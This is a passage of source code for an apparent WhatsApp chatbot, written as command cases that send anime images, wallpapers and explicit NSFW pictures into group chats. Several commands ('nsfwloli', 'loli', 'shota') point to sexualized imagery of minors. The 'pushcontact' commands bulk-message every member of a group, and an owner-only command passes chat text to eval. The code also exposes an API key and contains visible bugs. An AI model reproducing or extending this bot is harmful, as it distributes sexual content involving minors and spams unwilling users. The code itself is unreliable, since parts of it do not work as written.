if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
NFSBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '>':
case '=>':
if (!NFSTheCreator) return NFSStickOwner()
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replygcNFS(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcNFS(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcNFS(util.format(_syntax + _err))
}
break
case 'pushcontact': {
    if (!NFSTheCreator) return NFSStickOwner()
      if (!m.isGroup) return replygcNFS(`Fitur ini hanya berfungsi di grup`)
    if (!text) return replygcNFS(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcNFS(`Sukses dalam mendorong pesan ke kontak`)
    for (let pler of mem) {
    NFSBotInc.sendMessage(pler, { text: q})
     }  
     replygcNFS(`Selesai`)
      }
      break
case "pushcontactv2":{
if (!NFSTheCreator) return NFSStickOwner()
if (!q) return replygcNFS(`Penggunaan yang Salah Silakan Gunakan Perintah Seperti Ini\n${prefix+command} idgc|text`)
NFSStickWait()
const metadata2 = await NFSBotInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
NFSBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcNFS(`Berhasil`)
}
break

            case 'id':{
            replygcNFS(from)
           }
          break
          case 'userjid':{
          	if(!NFSTheCreator) return NFSStickOwner()
        const groupMetadata = m.isGroup ? await NFSBotInc.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Berikut adalah alamat jid dari semua pengguna_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygcNFS(textt)
    }
    break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcNFS(`*Contoh :* ${prefix + command} 😅+🤔`)
		if (!emoji2) return replygcNFS(`*Contoh :* ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await NFSBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	case 'hentaivid2': {
if (!m.isGroup) return NFSStickGroup()
if (!AntiNsfw) return replygNFS(mess.nsfw)
NFSStickWait()
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
NFSBotInc.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Judul : ${cejd.title}
⭔ Kategori : ${cejd.category}
⭔ Tipe Anime : ${cejd.type}
⭔ Tampilan : ${cejd.views_count}
⭔ Saham : ${cejd.share_count}
⭔ Sumber : ${cejd.link}
⭔ Url Media : ${cejd.video_1}` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return NFSStickGroup()
if (!AntiNsfw) return replygcNFS(mess.nsfw)
                NFSStickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                NFSBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Judul : ${result912.title}\n${themeemoji} Kategori : ${result912.category}\n${themeemoji} Tipe Anime : ${result912.type}\n${themeemoji} Tampilan : ${result912.views_count}\n${themeemoji} Saham : ${result912.share_count}\n${themeemoji} Sumber : ${result912.link}\n${themeemoji} Url Media : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return NFSStickGroup()
if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' : case 'hneko' :
if (!m.isGroup) return NFSStickGroup()
if (!AntiNsfw) return replygcNFS(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' : case 'nwaifu' :
if (!m.isGroup) return NFSStickGroup()
if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return NFSStickGroup()
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return NFSStickGroup()
if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await NFSBotInc.sendMessage(m.chat, { caption:  `Ini dia!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'thighs':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thighs.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var NFSyresult = pickRandom(ahegaonsfw)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: NFSyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return NFSStickGroup()
if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await NFSBotInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return NFSStickGroup()
if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var NFSyresultx = pickRandom(ahegaonsfw)
    await NFSBotInc.sendMessage(m.chat,{video:NFSyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return NFSStickGroup()
if (!AntiNsfw) return replygcNFS(mess.nsfw)
NFSStickWait()
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/foot.json')
NFSBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'animeawoo':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
